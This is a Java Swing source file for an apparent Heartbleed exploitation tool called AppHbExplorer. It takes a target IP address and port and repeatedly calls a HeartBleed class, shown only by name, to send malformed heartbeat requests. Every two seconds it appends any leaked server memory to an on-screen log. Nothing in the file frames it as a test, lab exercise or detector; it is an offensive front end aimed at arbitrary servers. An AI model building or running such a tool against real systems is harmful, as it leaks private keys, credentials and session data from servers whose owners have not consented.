/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package br.com.radaction.main;

import java.awt.Image;
import java.awt.Toolkit;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;
import javax.swing.text.BadLocationException;
import javax.swing.text.StyledDocument;

/**
 *
 * @author tiago
 */
public class AppHbExplorer extends javax.swing.JFrame {

    private static boolean continueThread = true;
    private static final String IPADDRESS_PATTERN
            = "^([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\."
            + "([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\."
            + "([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\."
            + "([01]?\\d\\d?|2[0-4]\\d|25[0-5])$";

    public AppHbExplorer() {
        initComponents();
        
        setIcon();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        tbtStartStop = new javax.swing.JToggleButton();
        lbIpAddr = new javax.swing.JLabel();
        txtIpAddr = new javax.swing.JTextField();
        spTextOfServer = new javax.swing.JScrollPane();
        txtpTextOfServer = new javax.swing.JTextPane();
        lbPort = new javax.swing.JLabel();
        txtPort = new javax.swing.JTextField();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        tbtStartStop.setText("Start");
        tbtStartStop.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                tbtStartStopActionPerformed(evt);
            }
        });

        lbIpAddr.setText("IP Address:");

        spTextOfServer.setViewportView(txtpTextOfServer);

        lbPort.setText("Port:");

        txtPort.setText("443");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(spTextOfServer)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(lbIpAddr)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(txtIpAddr, javax.swing.GroupLayout.DEFAULT_SIZE, 398, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(lbPort)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(txtPort, javax.swing.GroupLayout.PREFERRED_SIZE, 70, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(tbtStartStop, javax.swing.GroupLayout.PREFERRED_SIZE, 60, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(tbtStartStop)
                    .addComponent(lbIpAddr)
                    .addComponent(txtIpAddr, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(lbPort)
                    .addComponent(txtPort, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(spTextOfServer, javax.swing.GroupLayout.DEFAULT_SIZE, 352, Short.MAX_VALUE)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void tbtStartStopActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_tbtStartStopActionPerformed
        if (tbtStartStop.isSelected()) {
            continueThread = true;
            tbtStartStop.setText("Stop");
            if (validateForm()) {
                start();
            } else {
                JOptionPane.showMessageDialog(rootPane, "Invalid IP Address!!!");
                txtIpAddr.requestFocus();
                tbtStartStop.setSelected(false);
                tbtStartStop.setText("Start");
            }

        } else {
            tbtStartStop.setText("Start");
            continueThread = false;
        }
    }//GEN-LAST:event_tbtStartStopActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new AppHbExplorer().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel lbIpAddr;
    private javax.swing.JLabel lbPort;
    private javax.swing.JScrollPane spTextOfServer;
    private javax.swing.JToggleButton tbtStartStop;
    private javax.swing.JTextField txtIpAddr;
    private javax.swing.JTextField txtPort;
    private javax.swing.JTextPane txtpTextOfServer;
    // End of variables declaration//GEN-END:variables

    private boolean validateForm() {
        Pattern pat = Pattern.compile(IPADDRESS_PATTERN);
        Matcher m = pat.matcher(txtIpAddr.getText());
        if (m.matches()) {
            return true;
        } else {
            return false;
        }

    }

    private void start() {
        Thread worker = new Thread() {
            public void run() {

                while (continueThread) {
                    try {
                        SwingUtilities.invokeLater(new Runnable() {
                            public void run() {
                                try {
                                    InetAddress ipTarget = InetAddress.getByName(txtIpAddr.getText());
                                    HeartBleed hb = new HeartBleed();
                                    StyledDocument sd = (StyledDocument) txtpTextOfServer.getDocument();
                                    if (ipTarget.isReachable(300)) {
                                        try {
                                            hb.connect(txtIpAddr.getText(), Integer.valueOf(txtPort.getText()));
                                            hb.hello();
                                            hb.heartBeat("");
                                            if (!txtpTextOfServer.getText().contains(hb.getMemoryMessage())) {
                                                sd.insertString(sd.getLength(), hb.getMemoryMessage() + "\n", null);
                                            }
                                        } catch (BadLocationException ex) {
                                            Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                            JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                            txtIpAddr.requestFocus();
                                            tbtStartStop.setSelected(false);
                                            tbtStartStop.setText("Start");
                                            Thread.currentThread().interrupt();
                                            continueThread = false;
                                        } catch (IOException ex) {
                                            Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                            JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                            txtIpAddr.requestFocus();
                                            tbtStartStop.setSelected(false);
                                            tbtStartStop.setText("Start");
                                            Thread.currentThread().interrupt();
                                            continueThread = false;
                                        }
                                    } else {
                                        JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                        txtIpAddr.requestFocus();
                                        tbtStartStop.setSelected(false);
                                        tbtStartStop.setText("Start");
                                        Thread.currentThread().interrupt();
                                        continueThread = false;
                                    }
                                } catch (UnknownHostException ex) {
                                    Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                    JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                    txtIpAddr.requestFocus();
                                    tbtStartStop.setSelected(false);
                                    tbtStartStop.setText("Start");
                                    Thread.currentThread().interrupt();
                                    continueThread = false;

                                } catch (IOException ex) {
                                    Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                    JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                    txtIpAddr.requestFocus();
                                    tbtStartStop.setSelected(false);
                                    tbtStartStop.setText("Start");
                                    Thread.currentThread().interrupt();
                                    continueThread = false;

                                }
                            }

                        });
                        if (!continueThread) {
                            txtIpAddr.requestFocus();
                            tbtStartStop.setSelected(false);
                            tbtStartStop.setText("Start");
                            Thread.currentThread().interrupt();
                        }
                        Thread.sleep(2000);
                    } catch (InterruptedException ex) {
                        Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        };

        worker.start();
    }

    private void setIcon() {
        setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/hblogoicon.png")));
    }
}
